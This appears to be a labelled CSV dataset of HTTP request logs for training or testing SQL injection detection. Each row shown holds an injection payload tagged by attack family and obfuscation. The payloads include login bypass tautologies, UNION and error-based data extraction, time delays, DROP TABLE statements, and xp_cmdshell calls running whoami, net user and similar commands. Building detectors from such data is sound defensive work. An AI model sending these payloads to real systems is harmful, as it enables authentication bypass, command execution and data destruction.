time,source_ip,host,method,uri,user_agent,request_body,referer,flow_uid,dup_index,session_id,session_seq,label,attack_family,obfuscated,synthetic_duplicate,forced_unique_nonce,TEMP_benign_augmentation,aug_category
2023-08-15T22:33:43Z,141.94.222.8,37.85.58.9:80,GET,"/redirect?search="" AND 6=CAst((SelecT @@vERSIoN) AS INt)--","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,https://www.bing.com/,a_CiltYe2CQOsPPjm914,0,3d9c8496db09,2,1,error_based,True,False,False,,
2023-07-15T18:15:56Z,161.132.108.214,37.85.58.9:80,GET,/filter?id=%27;/**/EXEC/**/xp_cmdshell(%27ls/**/-la%27)--,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",,https://duckduckgo.com/,a_CMnTDl1b3xslromDR5,0,fd4081d9b7cf,1,1,stacked_query,True,False,False,,
2023-07-10T04:12:51Z,158.67.185.111,37.85.58.9:80,GET,/api/items?redirect=%27/**/or/**/z=z/**/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,,a_C0Xv2t37bg4Q7L6Az8,0,7020e8dc40a9,3,1,tautology,True,False,False,,
2023-07-15T18:15:57Z,161.132.108.214,37.85.58.9:80,POST,/admin/login.php,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36","username=""; EXEC xp_cmdshell('id')-- -&password=x",https://www.google.com/,a_C44rtp3bq1def4QCX1,0,fd4081d9b7cf,2,1,stacked_query,False,False,False,,
2023-07-17T20:13:26Z,210.63.245.185,37.85.58.9:443,POST,/account/login,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",username=8573 OR 1=1/*x*/&password=x,,a_Ct7e9v1IvyPaw3A0E3,0,3f73c352c0dd,1,1,tautology,False,False,False,,
2023-08-15T06:12:47Z,97.50.240.188,37.85.58.9:80,POST,/signin,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","username=5984"" ORDER BY 18/*x*/&password=x",-,a_CuxiP5vhHc86lWWAf,0,c4463e9f2128,3,1,error_based,False,False,False,,
2023-08-15T22:34:00Z,218.165.157.21,37.85.58.9:80,POST,/portal/login,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",username=' WAITFOR DELAY '0:0:02'--&password=x,-,a_C00zRQ1lFrHrmkbrf,0,22c9fbaef137,1,1,time_based_blind,True,False,False,,
2023-07-15T18:58:48Z,181.124.35.240,37.85.58.9:80,GET,/redirect?ref=7126' OR 'x'='x'-- -,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,,a_CIPUcAT0zCs1kmSsl,0,19f68c6fbb5c,1,1,tautology,True,False,False,,
2023-07-15T14:42:10Z,25.8.232.145,37.85.58.9:80,POST,/portal/login,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",username=6639; DROP TABLE payments-- -&password=x,,a_CYpjWp2V5Lg1tZRJj3,0,2b3681537c30,1,1,stacked_query,False,False,False,,
2023-08-15T22:32:55Z,141.94.222.8,37.85.58.9:80,GET,"/redirect?term=""/**/AND/**/2=CAST((SELECT/**/@@version)/**/AS/**/int)#","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,-,a_CExsJt3sMLrVQcqLx,0,3d9c8496db09,3,1,error_based,True,False,False,,
2023-07-15T18:58:48Z,181.124.35.240,37.85.58.9:80,POST,/signin,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15","username="";%20EXEC%20xp_cmdshell(%27uname%20-a%27)/*x*/&password=x",,a_CuqOaM1WuVWVXVTh6c,0,19f68c6fbb5c,2,1,stacked_query,True,False,False,,
2023-07-17T18:20:42Z,210.229.153.174,37.85.58.9:80,GET,"/filter?q=297""/**/ORDER/**/BY/**/28--/**/-","Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/124.0.0.0 Safari/537.36",,-,a_CMtsYT1hSv7w9WmCV7,0,cc3b1458adb0,1,1,error_based,True,False,False,,
2023-07-10T04:48:59Z,104.83.80.53,37.85.58.9:80,POST,/signin,"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/124.0.0.0 Safari/537.36",username='; EXEC xp_cmdshell('ls -la')--&password=x,-,a_CPn7Dk1ol0JEIf7Gwh,0,0437664bf8d7,1,1,stacked_query,False,False,False,,
2023-07-11T02:52:05Z,144.16.4.28,37.85.58.9:80,POST,/portal/login,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","username="" AND SLEEP(20)--&password=x",https://www.google.com/,a_C9SKiszFk9WslCo1h,0,658343fa161b,1,1,time_based_blind,False,False,False,,
2023-07-10T04:12:59Z,158.67.185.111,37.85.58.9:80,GET,"/browse?ref="" UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,-,a_Cgxb4r14ba0AjqxiYk,0,7020e8dc40a9,4,1,union_based,False,False,False,,
2023-08-15T22:33:36Z,141.94.222.8,37.85.58.9:80,GET,"/catalog?term="" OR 1=1-- comment","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,https://www.google.com/,a_CLUGUA1Fuu7qVAQgwi,0,3d9c8496db09,4,1,tautology,False,False,False,,
2023-07-15T18:16:39Z,117.27.128.238,37.85.58.9:80,GET,"/redirect?redirect=27"" AND 27=27--",Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,,https://www.bing.com/,a_C57Plu41pCZG83L1uc,0,48868df77119,2,1,boolean_blind,False,False,False,,
2023-08-15T06:13:47Z,97.50.240.188,37.85.58.9:80,GET,"/browse?name=7"" AND 7=7/**/","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,,a_C6r5xe1UvjJHzUCNlf,0,c4463e9f2128,4,1,boolean_blind,False,False,False,,
2023-07-10T04:13:00Z,158.67.185.111,37.85.58.9:80,POST,/signin,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",username=oPerAtOR92%27--&password=x,,a_CyZtNw3uNsiQPk4uWb,0,7020e8dc40a9,5,1,auth_bypass,True,False,False,,
2023-08-11T11:28:22Z,177.188.234.67,37.85.58.9:80,GET,"/product?q="" UNION SELECT role,permissions FROM employees#",Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),,-,a_C9IRmh1vGvQcvbmdo1,0,f9c913f84b33,1,1,union_based,False,False,False,,
2023-08-15T10:03:55Z,218.48.11.6,37.85.58.9:80,GET,"/api/items?id=16"" AND 16=14/**/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,https://www.bing.com/,a_CnKZ5W3TgAnVSx5sdj,0,31a095dca372,2,1,boolean_blind,False,False,False,,
2023-08-13T15:55:50Z,44.214.106.171,37.85.58.9:80,POST,/api/auth,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","username=%27%20AnD%20uPdATeXML(1,COnCAt(0x7E,(SElEct%20vErSIoN()),0x7e),1)--%20COmMenT&password=x",https://www.bing.com/,a_CtOwlr1zbTBmPO1Xsf,0,1dbafeff5892,1,1,error_based,True,False,False,,
2023-07-15T18:15:37Z,161.132.108.214,37.85.58.9:80,POST,/api/auth,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36","username="" UNION SELECT NULL,NULL,NULL,NULL-- -&password=x",,a_CBnYWp1BUlzI89U2S9,0,fd4081d9b7cf,3,1,union_based,True,False,False,,
2023-08-13T15:56:01Z,129.136.206.117,37.85.58.9:80,GET,/catalog?q=root3'-- comment,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,-,a_C5ISJue44teY92lgd,0,91095dbc12a5,2,1,auth_bypass,False,False,False,,
2023-08-16T10:14:19Z,116.35.129.17,37.85.58.9:80,POST,/api/auth,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",username=28%27/**/AND/**/28=28--/**/-&password=x,,a_CSda9huEnBYfjqbdh,0,1d8f5fc45707,1,1,boolean_blind,True,False,False,,
2023-08-14T11:45:45Z,189.197.204.14,37.85.58.9:80,POST,/portal/login,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","username="" AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--&password=x",,a_CVvaQG3lEg1QTX1Ijk,0,6176a0aeb94e,1,1,error_based,False,False,False,,
2023-07-17T04:49:44Z,71.8.244.85,37.85.58.9:80,POST,/signin,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0,username=1494; DROP TABLE admin#&password=x,https://www.bing.com/,a_C03pg34nrMFrdhmiy9,0,cf37591a0024,1,1,stacked_query,False,False,False,,
2023-07-16T19:13:20Z,5.160.118.177,37.85.58.9:80,POST,/account/login,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",username=8027; DrOP Table aDmIn#&password=x,https://duckduckgo.com/,a_CLjzGi2OIcxyhaC66i,0,7a1d90cff4a5,1,1,stacked_query,True,False,False,,
2023-07-08T22:45:44Z,137.216.135.96,37.85.58.9:80,POST,/portal/login,sqlmap/1.7.11#stable (http://sqlmap.org),username=administrator66'-- comment&password=x,https://duckduckgo.com/,a_ChDdsJ111flNFfkQH2,0,a0431481e48a,1,1,auth_bypass,False,False,False,,
2023-08-13T15:55:45Z,44.214.106.171,37.85.58.9:80,GET,"/catalog?query="" OR 1=1#","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,https://www.google.com/,a_CG7ca8V4oumCYcUSj,0,1dbafeff5892,2,1,tautology,True,False,False,,
2023-07-15T22:38:47Z,94.12.105.219,37.85.58.9:80,POST,/api/auth,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,username='/**/aND/**/6=caSt((seLecT/**/@@veRSIon)/**/As/**/Int)--&password=x,https://www.google.com/,a_CdP0S93zKd8Oasn4w1,0,ff4b6ba9e33d,1,1,error_based,True,False,False,,
2023-07-08T22:45:44Z,137.216.135.96,37.85.58.9:80,GET,/product?search='; EXEC xp_cmdshell('type C:\\boot.ini')--,sqlmap/1.7.11#stable (http://sqlmap.org),,-,a_C6knAv3sP1t4Ha3kn9,0,a0431481e48a,2,1,stacked_query,False,False,False,,
2023-07-10T04:13:05Z,158.67.185.111,37.85.58.9:80,GET,"/filter?id=24"" AND 24=24-- -","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,,a_COAZ921ZGvOBGIa4dd,0,7020e8dc40a9,6,1,boolean_blind,False,False,False,,
2023-07-17T03:53:54Z,200.49.71.103,37.85.58.9:80,GET,/lookup?id='; EXEC xp_cmdshell('whoami')/**/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,-,a_C3Q31y3V8J5pZZ5VE9,0,ccdd86bc3838,2,1,stacked_query,False,False,False,,
2023-07-17T03:54:06Z,197.112.31.83,37.85.58.9:80,GET,/api/items?ref=1717%20or%20yeS=YES--,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,-,a_CUL3BC4jF2CEL1guD2,0,24ea6fe19031,1,1,tautology,True,False,False,,
2023-07-17T18:56:23Z,65.7.38.139,37.85.58.9:80,POST,/signin,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",username=oPERaTOR55'#&password=x,https://www.google.com/,a_CHTWGE4Mhbmf9BW4ce,0,e5f616b0e6a2,1,1,auth_bypass,True,False,False,,
2023-08-13T15:55:28Z,44.214.106.171,37.85.58.9:80,GET,"/search?name="" WAITFOR DELAY '0:0:08'/*x*/","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,https://www.google.com/,a_COt97E264HKxOvXZA3,0,1dbafeff5892,3,1,time_based_blind,False,False,False,,
2023-07-15T18:15:26Z,161.132.108.214,37.85.58.9:80,GET,/browse?q=' OR x=x/*x*/,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",,,a_C7hPAg3qAUgN394ccf,0,fd4081d9b7cf,4,1,tautology,False,False,False,,
2023-07-15T23:27:44Z,13.206.210.252,37.85.58.9:80,POST,/portal/login,python-requests/2.31.0,"username=6077"" ORDER BY 11-- -&password=x",https://www.google.com/,a_CQCGYEeP0U2xtFBt9,0,64a5d991f585,1,1,error_based,False,False,False,,
2023-07-15T18:16:34Z,117.27.128.238,37.85.58.9:80,POST,/admin/login.php,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,"username=7829"" ORDER BY 18/*x*/&password=x",https://duckduckgo.com/,a_CDh7vT1bt7LQienhUi,0,48868df77119,3,1,error_based,False,False,False,,
2023-07-17T03:54:43Z,197.112.31.83,37.85.58.9:80,POST,/admin/login.php,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15","username=27"" ANd 27=23/*X*/&password=x",https://www.google.com/,a_CPJMNy4qn1oEc8yeEb,0,24ea6fe19031,2,1,boolean_blind,True,False,False,,
2023-08-15T06:13:51Z,97.50.240.188,37.85.58.9:80,GET,/lookup?q=root'/**/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,,a_Cgz0Ay3ojFcxeCI8j4,0,c4463e9f2128,5,1,auth_bypass,False,False,False,,
2023-07-17T03:53:46Z,200.49.71.103,37.85.58.9:80,GET,/redirect?id=91' OR 'x'='x'/*x*/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,https://www.bing.com/,a_C0Wqs8hGb0ddQ18va,0,ccdd86bc3838,3,1,tautology,False,False,False,,
2023-08-15T22:34:07Z,218.165.157.21,37.85.58.9:80,GET,/search?name='; EXEC xp_cmdshell('net user')-- -,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",,https://www.bing.com/,a_CyteP73K1PY17KBYSf,0,22c9fbaef137,2,1,stacked_query,False,False,False,,
2023-07-10T04:48:55Z,104.83.80.53,37.85.58.9:80,POST,/api/auth,"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/124.0.0.0 Safari/537.36",username=' AND SLEEP(12)/*x*/&password=x,,a_CLR3mJ1hut8bQCfeMk,0,0437664bf8d7,2,1,time_based_blind,False,False,False,,
2023-08-13T15:54:54Z,44.214.106.171,37.85.58.9:80,GET,"/filter?ref=%27%20AND%20EXTRACTVALUE(1,CONCAT(0x7e,(SELECT%20@@version)))--%20-","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,-,a_CU2QJI3bgFZMdlEzWk,0,1dbafeff5892,4,1,error_based,True,False,False,,
2023-07-11T06:04:37Z,6.35.198.22,37.85.58.9:80,POST,/portal/login,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0,username=7309%27/**/WAITFOR/**/DELAY/**/%270:0:03%27#&password=x,https://duckduckgo.com/,a_CrJvDfO3V1pTZhT83,0,5bc88cf60b68,1,1,time_based_blind,True,False,False,,
2023-08-15T06:13:31Z,97.50.240.188,37.85.58.9:80,POST,/signin,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","username=17"" AND 17=17/**/&password=x",-,a_CRt79j465NdSsoraXl,0,c4463e9f2128,6,1,boolean_blind,True,False,False,,
2023-07-10T04:12:35Z,158.67.185.111,37.85.58.9:80,GET,"/search?ref=' UNION SELECT NULL,NULL,NULL,NULL/*x*/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,https://duckduckgo.com/,a_CfldyI1hpB2YpMsxcb,0,7020e8dc40a9,7,1,union_based,False,False,False,,
2023-07-17T03:54:00Z,197.112.31.83,37.85.58.9:80,GET,/browse?q=2490; DROP TABLE payments/*x*/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,https://duckduckgo.com/,a_CVDsvaSEb9ffzPEHd,0,24ea6fe19031,3,1,stacked_query,False,False,False,,
2023-08-15T22:33:15Z,141.94.222.8,37.85.58.9:80,GET,"/redirect?name="" UNION SELECT NULL,NULL,NULL,NULL,NULL-- comment","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,https://www.bing.com/,a_CkgmzCmL5LRIKmXk1,0,3d9c8496db09,5,1,union_based,True,False,False,,
2023-07-08T22:45:44Z,137.216.135.96,37.85.58.9:80,POST,/api/auth,sqlmap/1.7.11#stable (http://sqlmap.org),"username=7004"" OR 'a'='a'--&password=x",,a_CBV43Ym73YnOqnuc5,0,a0431481e48a,3,1,tautology,False,False,False,,
2023-08-13T15:55:28Z,44.214.106.171,37.85.58.9:80,POST,/portal/login,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","username="" AND SLEEP(7)/**/&password=x",https://www.google.com/,a_CMjsoo43ONIzrx0SOl,0,1dbafeff5892,5,1,time_based_blind,False,False,False,,
2023-08-13T15:55:34Z,44.214.106.171,37.85.58.9:80,POST,/admin/login.php,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","username=5375""/**/And/**/SLeEp(1)#&password=x",,a_CrrPYv42Hsdcp4vYX5,0,1dbafeff5892,6,1,time_based_blind,True,False,False,,
2023-07-17T03:54:10Z,197.112.31.83,37.85.58.9:80,GET,/search?ref=8249'/**/ORDER/**/BY/**/21--/**/comment,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,https://www.google.com/,a_CEKUDGfVrysbOoiQ3,0,24ea6fe19031,4,1,error_based,True,False,False,,
2023-07-10T04:13:16Z,158.67.185.111,37.85.58.9:80,POST,/api/auth,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",username=operator'/*x*/&password=x,https://www.bing.com/,a_CilrOCTr6n3W6TgSj,0,7020e8dc40a9,8,1,auth_bypass,False,False,False,,
2023-08-15T06:13:05Z,97.50.240.188,37.85.58.9:80,GET,/api/items?term=7046 OR x=x-- comment,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,,a_CnXCp521gp2VSDHH1k,0,c4463e9f2128,7,1,tautology,True,False,False,,
2023-07-10T04:49:12Z,104.83.80.53,37.85.58.9:80,POST,/account/login,"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/124.0.0.0 Safari/537.36","username=""%20or%20Z=Z/*x*/&password=x",https://www.google.com/,a_CyUJYEfYI9MJPmylf,0,0437664bf8d7,3,1,tautology,True,False,False,,
2023-07-15T14:42:12Z,25.8.232.145,37.85.58.9:80,POST,/account/login,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",username=9087' OR 'true'='true'#&password=x,https://duckduckgo.com/,a_CIYxlWIbA5iryVvu9,0,2b3681537c30,2,1,tautology,False,False,False,,
2023-08-15T06:13:44Z,97.50.240.188,37.85.58.9:80,GET,"/filter?ref="" WAITFOR DELAY '0:0:03'-- comment","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,,a_C3ugld4aqFWfXWIyv7,0,c4463e9f2128,8,1,time_based_blind,True,False,False,,
2023-07-10T04:49:23Z,104.83.80.53,37.85.58.9:80,GET,/search?query=681' Or 'tRue'='trUe'-- -,"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/124.0.0.0 Safari/537.36",,,a_C6DBw43ooHKvNSKzUg,0,0437664bf8d7,4,1,tautology,True,False,False,,
2023-07-17T03:54:02Z,197.112.31.83,37.85.58.9:80,GET,/filter?term=29'/**/and/**/29=29--/**/ComMEnT,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,-,a_CykCdb4dykMR5n6njb,0,24ea6fe19031,5,1,boolean_blind,True,False,False,,
